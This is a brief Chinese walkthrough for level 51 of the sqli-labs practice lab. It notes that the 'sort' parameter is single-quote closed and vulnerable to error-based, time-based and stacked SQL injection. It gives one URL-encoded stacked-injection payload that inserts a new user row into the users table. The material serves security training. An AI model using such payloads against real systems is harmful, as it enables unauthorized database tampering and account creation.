## sql-labs第五十一关

该参数单引号闭合，可以报错注入，可以延时注入，可以堆叠注入

![](.\img\a79817b6f469078b522c10005ee934c2.png)





~~~ cmd
?sort=1%27;insert%20into%20users(id,username,password)%20values%20(%2750%27,%27less38%27,%27hello%27)--+
~~~

![](.\img\Less-50-01.PNG)